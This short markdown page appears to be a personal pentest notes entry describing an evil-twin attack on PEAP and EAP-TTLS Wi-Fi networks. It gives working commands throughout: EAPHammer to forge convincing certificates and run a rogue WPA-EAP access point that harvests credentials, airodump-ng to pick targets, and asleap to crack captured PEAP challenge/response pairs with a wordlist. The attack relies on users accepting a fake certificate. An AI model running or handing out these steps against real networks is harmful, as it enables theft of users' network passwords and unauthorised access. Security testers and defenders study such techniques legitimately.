---
title: PEAP/EAP-TTLS
---

## What is this about?
Going for a 2 for one here since the attack is basically the same...

## So what are we doing today?
We're pulling out the big guns and aiming for the passwords in an EvilTwin scenario. But since this is somewhat a get framework and run options, I'll keep it short.

### The Setup
Install [EAPHammer](https://github.com/s0lst1c3/eaphammer). Read the docs too because there are multiple setups and attacks you can setup and run on this. This will be the most basic example only...

Generate certificates that look legit to a human with
```
./eaphammer --cert-wizard
```
Find your target with
```
airodump-ng mon0
```
Then adapt the bssid, essid and channel and and run the following line
```
./eaphammer --bssid 00:11:22:33:44:55 --essid potato-wifi --channel 2 --wpa 2 --auth wpa-eap --interface wlan0 --creds
```
Hope that a user will click *YES* when your certificate pops on the screen.
If you're attacking an EAP-TTLS, you're pretty much done here...

For PEAP, you just need to wait for usernames/challenges/responses to come to you ;)

#### PEAP Getting the password
You can add the *--autocrack* option to eaphammer and send it to your cracking rig, but where's the fun in that eh?

Get [asleap](https://github.com/joswr1ght/asleap), build it and run it.
```
asleap –C <challenge> -R <response> -W <wordlist>
```
Done!